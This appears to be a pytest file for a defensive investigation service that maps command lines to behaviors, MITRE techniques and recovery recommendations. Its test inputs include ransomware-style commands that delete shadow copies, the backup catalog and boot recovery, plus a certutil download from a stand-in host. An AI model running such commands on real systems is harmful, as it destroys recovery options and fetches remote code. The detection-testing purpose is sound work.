"""P0.8 · Graph-oriented Provenance response + UAIE Behavior Extractor.

Two contracts:
    · Provenance endpoint returns a stable ``graph: {nodes, edges}``
      view alongside the behavior list.
    · ``services.uaie.behavior_extractor.extract_behaviors`` bridges
      the UAIE OrchestratorResult into deterministic Behaviors, so
      every UAIE investigation flows through the same semantic
      layer (not only URL-ingested cases).
"""
from __future__ import annotations

from fastapi.testclient import TestClient

from server import app
from services.uaie import plugins as _p                              # noqa: F401
from services.uaie.orchestrator import Orchestrator
from services.uaie.ssot_projector import project as uaie_project
from services.uaie.behavior_extractor import extract_behaviors


client = TestClient(app)


# ══════════════════════════════════════════════════════════════════
# Part A · graph-oriented endpoint response
# ══════════════════════════════════════════════════════════════════
def _endpoint(behaviors: list) -> dict:
    r = client.post("/api/investigation/behaviors/explain",
                        json={"behaviors": behaviors})
    assert r.status_code == 200, r.text
    return r.json()


def test_endpoint_schema_bumped_to_1_1():
    d = _endpoint([])
    assert d["schema_version"] == "1.1"


def test_endpoint_includes_stable_graph_view():
    d = _endpoint([
        {"behavior_type": "shadow_copy_deletion",
         "label":         "Shadow copy deletion",
         "source":        "command_classifier",
         "source_ref":    "body.line.37",
         "provenance":    "command_execution",
         "evidence":      {"command": "vssadmin delete shadows"}},
    ])
    g = d["graph"]
    assert set(g.keys()) == {"nodes", "edges"}

    # Node types present
    node_types = {n["type"] for n in g["nodes"]}
    assert "evidence"       in node_types
    assert "behavior"       in node_types
    assert "mitre"          in node_types     # T1490
    assert "kill_chain"     in node_types     # impact
    assert "impact"         in node_types     # recovery_inhibited
    assert "recommendation" in node_types     # erad.protect_shadow_copies

    # Edge types present
    edge_types = {e["type"] for e in g["edges"]}
    assert edge_types >= {"produces", "projects", "supports"}

    # Concrete chain: evidence → behavior → mitre(T1490)
    ev = next(n for n in g["nodes"] if n["type"] == "evidence")
    bh = next(n for n in g["nodes"] if n["type"] == "behavior")
    mt = next(n for n in g["nodes"] if n["type"] == "mitre"
                and n.get("value") == "T1490")
    assert any(e["from"] == ev["id"] and e["to"] == bh["id"]
                    and e["type"] == "produces" for e in g["edges"])
    assert any(e["from"] == bh["id"] and e["to"] == mt["id"]
                    and e["type"] == "projects" for e in g["edges"])
    # behavior → recommendation supports edge
    assert any(e["from"] == bh["id"] and e["type"] == "supports"
                    for e in g["edges"])


def test_graph_nodes_are_unique_per_id():
    d = _endpoint([
        {"behavior_type": "shadow_copy_deletion",
         "label":         "sc1", "source": "command_classifier",
         "source_ref":    "cmd:1", "provenance": "command_execution"},
        {"behavior_type": "shadow_copy_deletion",
         "label":         "sc2", "source": "command_classifier",
         "source_ref":    "cmd:2", "provenance": "command_execution"},
    ])
    ids = [n["id"] for n in d["graph"]["nodes"]]
    assert len(ids) == len(set(ids)), "graph node ids collided"
    # But both behaviors still surface as separate behavior nodes
    behavior_nodes = [n for n in d["graph"]["nodes"]
                             if n["type"] == "behavior"]
    assert len(behavior_nodes) == 2


def test_empty_input_yields_empty_graph():
    d = _endpoint([])
    assert d["graph"] == {"nodes": [], "edges": []}


# ══════════════════════════════════════════════════════════════════
# Part B · UAIE behavior extractor
# ══════════════════════════════════════════════════════════════════
def _orch(payload: bytes):
    return Orchestrator(recognizers=_p.all_recognizers(),
                          max_artifacts=64, max_depth=8
                          ).run(payload, filename="t.txt")


def test_uaie_extractor_produces_behaviors_from_commandline():
    r = _orch(b"cmd /c vssadmin delete shadows /all /quiet")
    bs = extract_behaviors(r)
    btypes = {b.behavior_type for b in bs}
    assert "shadow_copy_deletion" in btypes
    # Every emitted behavior carries command_execution or
    # lolbas_binary_reference provenance — nothing invented.
    for b in bs:
        assert b.provenance in ("command_execution",
                                     "lolbas_binary_reference")


def test_uaie_extractor_surfaces_lolbas_from_command_context():
    r = _orch(b"powershell -c \"certutil.exe -urlcache -split -f http://a.example.com/x\"")
    bs = extract_behaviors(r)
    btypes = {b.behavior_type for b in bs}
    # certutil.exe embedded in the commandline → LOLBAS behavior
    assert "certutil_download" in btypes
    # powershell.exe head → LOLBAS entry for powershell.exe too
    assert "powershell_execution" in btypes


def test_uaie_extractor_deterministic_and_idempotent():
    r  = _orch(b"cmd /c vssadmin delete shadows /all /quiet")
    a  = extract_behaviors(r)
    b  = extract_behaviors(r)
    assert [x.id for x in a] == [x.id for x in b]


def test_uaie_extractor_zero_output_for_benign_payload():
    r = _orch(b"Hello, this is a plain text file describing lunch.")
    assert extract_behaviors(r) == []


def test_end_to_end_uaie_ransomware_now_fires_recovery_recs():
    """Closes the P0.2 skip · with the UAIE-side extractor wired,
    a real UAIE ransomware payload (no synthetic SSOT) now flows
    behaviors + impacts into the outcome, and the recovery rules
    fire.
    """
    from services.mitigation.evidence_driven.investigation_outcome \
        import empty_outcome
    from services.mitigation.evidence_driven.engine \
        import evidence_driven_recommendations
    from services.ida.behaviors \
        import collect_outcome_inputs_from_behaviors

    r  = _orch(
        b"cmd /c vssadmin delete shadows /all /quiet\r\n"
        b"cmd /c wbadmin delete catalog -quiet\r\n"
        b"cmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures"
    )
    behaviors = extract_behaviors(r)
    assert behaviors, "UAIE extractor produced zero behaviors on ransomware payload"

    inputs  = collect_outcome_inputs_from_behaviors(behaviors)
    outcome = empty_outcome()
    outcome["behaviors"]        = inputs["behaviors"]
    outcome["impacts"]          = inputs["impacts"]
    outcome["mitre_techniques"] = inputs["mitre_techniques"]

    rec_ids = {r["id"] for r in evidence_driven_recommendations(
                    investigation_outcome=outcome)["recommendations"]}
    assert "erad.protect_shadow_copies" in rec_ids
    # At least one impact-family rule fires.
    assert rec_ids & {"erad.stop_encryption",
                          "erad.protect_shadow_copies",
                          "rec.restore_backups"}


def test_uaie_extractor_is_a_producer_never_a_consumer():
    """Static contract check · the extractor imports Behavior +
    classify_command + LOLBAS map from ``services.ida.behaviors`` —
    but NEVER imports projection modules or the recommendation
    engine.  Producers must not consume."""
    import pathlib, ast
    src = pathlib.Path(
        "services/uaie/behavior_extractor.py").read_text(encoding="utf-8")
    tree = ast.parse(src)
    banned_imports = {
        "services.ida.projections.mitre",
        "services.ida.projections.kill_chain",
        "services.ida.projections.impact",
        "services.mitigation.evidence_driven.engine",
        "services.mitigation.evidence_driven.rules",
    }
    violations = []
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom):
            if node.module in banned_imports:
                violations.append(node.module)
    assert not violations, (
        "UAIE Behavior Extractor is a producer — it must not "
        f"consume projection/engine modules: {violations}")


def test_ssot_projector_consumes_uaie_extracted_behaviors():
    """End-to-end contract · UAIE extractor emits Behaviors, the
    projector consumes them into SSOT.  Projector never
    synthesizes."""
    r  = _orch(b"cmd /c vssadmin delete shadows /all /quiet")
    behaviors = extract_behaviors(r)
    ssot = uaie_project(r, root_input="vssadmin delete shadows",
                             behaviors=behaviors)
    assert "impact"             in ssot["behaviors"]
    assert "recovery_inhibited" in ssot["impacts"]
    assert ssot["behaviors_full"]
